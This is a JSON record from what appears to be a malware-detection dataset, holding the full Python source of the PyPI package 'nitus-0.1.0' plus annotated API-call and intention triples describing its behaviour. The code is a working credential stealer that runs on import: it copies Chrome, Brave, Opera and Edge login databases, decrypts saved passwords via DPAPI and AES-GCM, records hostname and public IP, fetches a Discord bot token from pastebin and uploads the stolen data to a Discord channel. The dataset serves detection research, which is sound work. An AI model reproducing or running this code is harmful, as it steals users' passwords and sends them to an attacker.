{
  "metadata": {
    "package_name": "nitus-0.1.0",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/nitus-0.1.0.txt",
    "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py",
    "code_hash": "5ec8b527b6aa8ceadd083a7f6792b979",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/nitus-0.1.0.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "hash_value": "5ec8b527b6aa8ceadd083a7f6792b979",
      "code_snippets": [
        {
          "snippet": "import os\nimport json\nimport base64\nimport sqlite3\nimport win32crypt\nfrom Crypto.Cipher import AES\nimport shutil\nfrom datetime import timezone, datetime, timedelta\nimport socket\nimport requests\nimport discord\nfrom discord.ext import commands\nimport asyncio\nimport subprocess\n\nuser = os.getlogin()\nofficiel = None\nif not os.path.exists(\"img\"):\n    os.makedirs(\"img\")\nsubprocess.run('systeminfo > img/systemes_infoos.txt', shell=True)\nwith open('img/systemes_infoos.txt', 'rb') as file:\n    try:\n        lines = file.read().decode('utf-8', errors='replace').splitlines()\n        windows_line = next((line.strip() for line in lines if \"Windows\" in line), None)\n        if windows_line:            \n            windows_version = windows_line.split(\"Windows\")[1][:3].strip()\n            windows_version.split(\" \")\n            windows_version = int(windows_version)\n\n    except UnicodeDecodeError as e:\n        print(f\"Erreur lors de la récupération des fichiers.\")\n    \nfichier_a_supprimer = \"img/systemes_infoos.txt\"\n\nif os.path.exists(fichier_a_supprimer):\n    os.remove(fichier_a_supprimer)\nelse:\n    print(f\"Le fichier img1.png n'existe pas.\")\n\nID_DU_SALON = 1213976356577349673\nasync def envoid(token, nom_fichiers):\n    intents = discord.Intents.default()\n    intents.all()\n\n    bot = commands.Bot(command_prefix='!', intents=intents)\n    nom_fichier = nom_fichiers\n    try:\n        @bot.event\n        async def on_ready():\n            salon = bot.get_channel(ID_DU_SALON)\n            if salon:\n                fichier_discord = discord.File(nom_fichier, filename=f\"{nom_fichiers}.txt\")\n                await salon.send(file=fichier_discord)\n            else:\n                print(\"Image(s) non trouvée(s)\")\n            await bot.close()\n        await bot.start(token)\n\n    except FileNotFoundError:\n        print(\"Les fichier n'ont pas été trouvé.\")\n\n\nurlrr = \"https://pastebin.com/raw/6NY4E73c\"\nreponseees = requests.get(urlrr)\ncontenus = str(reponseees.text)\nTOKEN = contenus\n\nnom_ordi = socket.gethostname()\n\ndef datet(chromedate):\n    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)\n\ndef enc():\n    global officiel\n    if officiel == r\"C:\\\\Users\\\\{}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\".format(user):\n        chrome_local_state_paths = [os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Local State\")]\n    elif officiel == r\"C:\\\\Users\\\\{}\\\\AppData\\\\Local\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Login Data\".format(user):\n        chrome_local_state_paths = [os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"BraveSoftware\", \"Brave-Browser\", \"User Data\", \"Local State\")]\n    elif officiel == r\"C:\\\\Users\\\\{}\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera Stable\\\\Default\\\\Login Data\".format(user):\n        chrome_local_state_paths = [os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Roaming\", \"Opera Software\", \"Opera Stable\", \"Local State\")]\n    elif officiel == r\"C:\\\\Users\\\\{}\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera GX Stable\\\\Login Data\".format(user):\n        chrome_local_state_paths = [os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Roaming\", \"Opera Software\", \"Opera GX Stable\", \"Local State\")]\n    elif officiel == r\"C:\\\\Users\\\\{}\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Login Data\".format(user):\n        chrome_local_state_paths = [os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Microsoft\", \"Edge\", \"User Data\", \"Local State\")]\n    elif officiel == r\"C:\\\\Users\\\\{}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1\\\\Login Data\".format(user):\n        chrome_local_state_paths = [os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Local State\")]\n\n    for local_state_path in chrome_local_state_paths:\n        try:\n            with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\n                local_state = f.read()\n                local_state = json.loads(local_state)\n                if \"os_crypt\" in local_state and \"encrypted_key\" in local_state[\"os_crypt\"]:\n                    key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n                    key = key[5:]\n                    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]\n        except (FileNotFoundError, json.JSONDecodeError, KeyError):\n            pass\n    return None\n\n\ndef dec(password, key):\n    try:\n        iv = password[3:15]\n        password = password[15:]\n        cipher = AES.new(key, AES.MODE_GCM, iv)\n        return cipher.decrypt(password)[:-16].decode()\n    except:\n        try:\n            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])\n        except:\n            return \"\"\n        \ndef Nitus():\n    global officiel\n    db_paths = [\n        os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Profile 1\", \"Login Data\"),\n        os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Default\", \"Login Data\"),\n        os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"BraveSoftware\", \"Brave-Browser\", \"User Data\", \"Default\", \"Login Data\"),\n        os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Roaming\", \"Opera Software\", \"Opera Stable\", \"Default\", \"Login Data\"),\n        os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Roaming\", \"Opera Software\", \"Opera GX Stable\", \"Login Data\"),\n        os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Microsoft\", \"Edge\", \"User Data\", \"Default\", \"Login Data\")\n    ]\n    with open(f\"img/{nom_ordi}\", \"a\") as file:\n        file.write(f\"{nom_ordi}\\n{ip_publique}\\nWindows {windows_version}\\n\\n\\n\")\n        for db_path in db_paths:\n            if os.path.exists(db_path):\n                try:\n                    filename = f\"img/ChromeData_{os.path.basename(db_path)}.db\"\n                    shutil.copyfile(db_path, filename)\n                    db = sqlite3.connect(filename)\n                    cursor = db.cursor()\n                    cursor.execute(\"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created\")\n                    officiel = db_path\n                    key = enc()\n                    for row in cursor.fetchall():\n                        origin_url = row[0]\n                        action_url = row[1]\n                        username = row[2]\n                        password = dec(row[3], key)\n                        date_created = row[4]\n                        date_last_used = row[5]\n                        if username or password:\n                            file.write(f\"Origin URL: {origin_url}\\nAction URL: {action_url}\\nUsername: {username}\\nPassword: {password}\\n\")\n                        else:\n                            continue\n                        if date_created != 86400000000 and date_created:\n                            file.write(f\"Creation date: {str(datet(date_created))}\\n\")\n                        if date_last_used != 86400000000 and date_last_used:\n                            file.write(f\"Last Used: {str(datet(date_last_used))}\\n\")\n                        file.write(\"=============================================================================\\n\")\n                    cursor.close()\n                    db.close()\n                    os.remove(filename)\n                except Exception as e:\n                    print(f\"Erreur lors du traitement du fichier\")\n    try:\n        nom_fichier = f\"img/{nom_ordi}\"\n        if os.path.exists(nom_fichier):\n            asyncio.run(envoid(TOKEN, nom_fichier))\n            os.remove(nom_fichier)\n    except Exception as e:\n        pass\n\n\ndef decalage_photo():\n    try:\n        response = requests.get('https://httpbin.org/ip')\n        ip_publique = response.json().get('origin')\n        return ip_publique\n    except Exception as e:\n        pass\n        return None\n\ntry:\n    with open(f\"img/{nom_ordi}.txt\", \"w\") as file:\n        file.close()\n    ip_publique = decalage_photo()\nexcept:\n    print(\"Erreur, dossier img ou musique manquant.\")",
          "triple_sequences": [
            {
              "action_api": "os.getlogin()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "Current username",
              "object_id": "current_username",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "img",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine directory presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "img",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "subprocess.run()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "systeminfo > img/systemes_infoos.txt",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Collect system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "img/systemes_infoos.txt",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "file.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using specified codec",
              "action_id": "decode_bytes_codec",
              "object": "utf-8",
              "object_description": "Character encoding type",
              "object_id": "character_encoding_type",
              "intention_description": "Decode bytes to string",
              "intention_id": "decode_bytes_to_string"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "img/systemes_infoos.txt",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine_file_presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "img/systemes_infoos.txt",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "discord.Intents.default()",
              "action_description": "Returns default Discord intents object",
              "action_id": "get_discord_intents",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "intents.all()",
              "action_description": "Enables all Discord intents",
              "action_id": "enable_discord_intents",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "commands.Bot()",
              "action_description": "Creates Discord bot instance",
              "action_id": "create_discord_bot",
              "object": "command_prefix='!', intents=intents",
              "object_description": "Discord bot token",
              "object_id": "discord_bot_token",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "bot.get_channel()",
              "action_description": "Retrieves Discord guild object by ID",
              "action_id": "get_discord_guild",
              "object": "ID_DU_SALON",
              "object_description": "Guild ID",
              "object_id": "guild_id",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "discord.File()",
              "action_description": "Create Discord file object",
              "action_id": "create_discord_file",
              "object": "nom_fichier, filename=f\"{nom_fichiers}.txt\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "salon.send()",
              "action_description": "Sends file and message to Discord channel",
              "action_id": "send_discord_file_message",
              "object": "file=fichier_discord",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "bot.close()",
              "action_description": "Closes the Discord bot connection",
              "action_id": "close_discord_bot",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Release connection resource",
              "intention_id": "release_connection_resource"
            },
            {
              "action_api": "bot.start()",
              "action_description": "Starts the Discord bot with provided token",
              "action_id": "start_discord_bot",
              "object": "token",
              "object_description": "Discord bot token",
              "object_id": "discord_bot_token",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "https://pastebin.com/raw/6NY4E73c",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "str()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "reponseees.text",
              "object_description": "HTTP response content from remote server",
              "object_id": "http_response_remote_content",
              "intention_description": "Decode downloaded content",
              "intention_id": "decode_downloaded_content"
            },
            {
              "action_api": "socket.gethostname()",
              "action_description": "Retrieves current host name",
              "action_id": "get_hostname",
              "object": "",
              "object_description": "Current hostname",
              "object_id": "current_hostname",
              "intention_description": "Collect system hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "datetime()",
              "action_description": "Parses string into datetime object",
              "action_id": "parse_datetime",
              "object": "datetime(1601, 1, 1)",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get datetime epoch",
              "intention_id": "get_datetime_epoch"
            },
            {
              "action_api": "timedelta()",
              "action_description": "Parses string into datetime object",
              "action_id": "parse_datetime",
              "object": "timedelta(microseconds=chromedate)",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get datetime epoch",
              "intention_id": "get_datetime_epoch"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Local State\"",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "local_state_path, \"r\", encoding=\"utf-8\"",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Access browser local state file",
              "intention_id": "access_browser_local_state"
            },
            {
              "action_api": "f.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access browser local state file",
              "intention_id": "access_browser_local_state"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "local_state",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "local_state[\"os_crypt\"][\"encrypted_key\"]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "win32crypt.CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "key, None, None, None, 0",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Profile 1\", \"Login Data\"",
              "object_description": "Browser data directory_file",
              "object_id": "browser_data_directory_file",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"img/{nom_ordi}\", \"a\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"{nom_ordi}\\n{ip_publique}\\nWindows {windows_version}\\n\\n\\n\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "db_path",
              "object_description": "Browser data directory_file",
              "object_id": "browser_data_directory_file",
              "intention_description": "Determine_file_presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "shutil.copyfile()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "db_path, filename",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "filename",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "db.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser password data",
              "intention_id": "query_browser_passwords"
            },
            {
              "action_api": "cursor.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract browser password data",
              "intention_id": "extract_browser_password_data"
            },
            {
              "action_api": "dec()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "row[3], key",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"Origin URL: {origin_url}\\nAction URL: {action_url}\\nUsername: {username}\\nPassword: {password}\\n\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"Creation date: {str(datet(date_created))}\\n\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"Last Used: {str(datet(date_last_used))}\\n\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "\"=============================================================================\\n\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "cursor.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "db.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "filename",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete temporary database",
              "intention_id": "delete_temporary_database"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "nom_fichier",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine_local_file_presence",
              "intention_id": "determine_local_file_presence"
            },
            {
              "action_api": "asyncio.run()",
              "action_description": "Runs asynchronous function until completion",
              "action_id": "run_async_function",
              "object": "envoid(TOKEN, nom_fichier)",
              "object_description": "Function_with_arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "nom_fichier",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "https://httpbin.org/ip",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "response.json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"img/{nom_ordi}.txt\", \"w\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            }
          ]
        }
      ]
    }
  ]
}